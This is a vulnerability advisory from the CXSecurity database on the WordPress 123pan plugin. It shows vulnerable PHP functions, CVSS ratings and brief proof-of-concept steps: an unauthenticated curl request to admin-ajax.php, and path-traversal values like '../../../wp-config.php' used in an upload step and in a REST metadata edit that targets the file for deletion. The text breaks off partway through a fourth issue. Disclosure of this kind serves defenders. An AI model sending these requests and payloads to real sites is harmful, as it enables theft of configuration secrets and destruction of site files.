---
title: WordPress 123pan Cloud Storage Plugin - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025040036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-25
fetch_date: 2025-10-06T22:03:30.082910
---

# WordPress 123pan Cloud Storage Plugin - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress 123pan Cloud Storage Plugin - Multiple Vulnerabilities** **2025.04.24**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
.:. Exploit Title > WordPress 123pan Cloud Storage Plugin - Multiple Vulnerabilities
.:. Date: April 19, 2025
.:. Exploit Author: bRpsd
.:. Contact: cy[at]live.no
.:. Vendor -> https://www.123pan.com/
.:. Product -> https://wordpress.org/plugins/123pan/
.:. Tested Version -> 1.0
.:. DBMS -> MySQL
.:. Tested on > macOS [\*nix Darwin Kernel], on local xampp
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[+] Vulnerability #1: Improper Authentication in Token Handling (CWE-287)
---------------------------------------------------------------
- Risk: High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1)
- Location: yunpan\_get\_yp\_token() function
- Attack Vector: Remote Unauthenticated
- Impact: Account Takeover, API Credential Theft
Vulnerable Code:
================================================================================================================
function yunpan\_get\_yp\_token($client\_id='', $client\_secret='', $save=0) {
$stored\_token = get\_option('yunpan\_access\_token');
$stored\_expiry = get\_option('yunpan\_token\_expiry');
$current\_time = current\_time('timestamp');
if ($stored\_token && $stored\_expiry && $stored\_expiry > $current\_time && !$save) {
return $stored\_token;
}
$options = get\_option('yunpan\_settings\_storage');
$client\_id = $client\_id ? $client\_id : $options['access\_key'];
$client\_secret = $client\_secret ? $client\_secret : $options['secret\_key'];
$api\_url = 'https://open-api.123pan.com/api/v1/access\_token';
$body = wp\_json\_encode(array(
'clientID' => $client\_id,
'clientSecret' => $client\_secret,
));
$args = array(
'headers' => array(
'Authorization' => 'Bearer ' . base64\_encode($client\_id . ':' . $client\_secret),
'Content-Type' => 'application/json',
'Platform' => 'open\_platform'
),
'body' => $body
);
$response = wp\_remote\_post($api\_url, $args);
// ...
}
================================================================================================================
Issue: The function is accessible via admin-ajax.php without authentication checks (confirmed via hook registration). Attackers can:
1-Bruteforce credential storage via repeated API calls
2-Manipulate client\_id/client\_secret through unsecured AJAX endpoints
3-Retrieve/stage Bearer tokens through base64-encoded credentials
Exploitation [poc]:
curl -X POST "https://victim-site.com/wp-admin/admin-ajax.php" \
-d "action=yunpan\_get\_token&client\_id=attacker\_id&client\_secret=attacker\_secret"
[+] Vulnerability #2: Unrestricted File Upload (CWE-434)
Risk: Critical (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.3)
Location: yunpan\_upload\_file\_to\_123pan()
Impact: Remote Code Execution, Data Exfiltration
Vulnerable code:
================================================================================================================
function yunpan\_upload\_file\_to\_123pan($file\_path, $file\_type, $url) {
$file\_contents = yunpan\_read\_file\_content($file\_path);
if (is\_wp\_error($file\_contents)) {
return $file\_contents;
}
$file\_size = yunpan\_get\_file\_size($file\_path);
$args = array(
'method' => 'PUT',
'headers' => array(
'Content-Type' => $file\_type,
'Content-Length' => $file\_size,
),
'body' => $file\_contents,
);
return wp\_remote\_request($url, $args);
}
================================================================================================================
Issue:The $file\_path parameter is derived from unsanitized user input via media upload forms. Attackers with contributor+ privileges can Upload PHP shells using path traversal (../../malicious.php),Overwrite core WordPress files via absolute path injection,Stage malicious files in executable directories.
Exploitation [poc]:
1-Identify the input field or API endpoint where the file path is provided.
2-Input a path to a malicious file.
3-Check if the file is uploaded and executed on the server.
Second POC:
1- Create post with media attachment path "../../../wp-config.php"
2- Observe sensitive configuration file exfiltration
[+] Vulnerability #3: Insecure File Deletion (CWE-22)
Risk: High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H | 8.6)
Location: yunpan\_delete\_remote\_attachment()
Impact: Denial of Service, Site Takeover
Vulnerable code:
================================================================================================================
function yunpan\_delete\_remote\_attachment($post\_id) {
$meta = wp\_get\_attachment\_metadata($post\_id);
$token = yunpan\_get\_yp\_token();
if (!empty($meta['file'])) {
$deleteObjects = [];
$file\_path = $meta['file'];
$deleteObjects[] = $file\_path;
yunpan\_open\_request('api/v1/file/base-path/trash', ['filePathList' => $deleteObjects], $token);
}
}
================================================================================================================
Issue: The function deletes files based on metadata that could be manipulated by an attacker. The file paths are not properly validated, this could lead to arbitrary file deletion. An attacker could manipulate metadata to delete critical files, leading to Denial of Service (DoS).Attachment metadata is stored in wp\_postmeta which is writable via REST API. Attackers can: Update postmeta via API to reference critical files,Trigger deletion of wp-config.php or .htaccess,Achieve persistent site compromise.
Exploitation [poc]:
PUT /wp-json/wp/v2/media/123 HTTP/1.1
{
"meta": {
"file": "../../../wp-config.php"
}
}
[+] Vulnerability #4: HTTP Header Injection (CWE-113)
Risk: Medium (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N | 5.4)
Location: yunpan\_open\_request()
Impact: SSRF, Cache Poisoning, Open Redirect
Vulnerable code:
================================================================================================================
function yunpan\_open\_reque...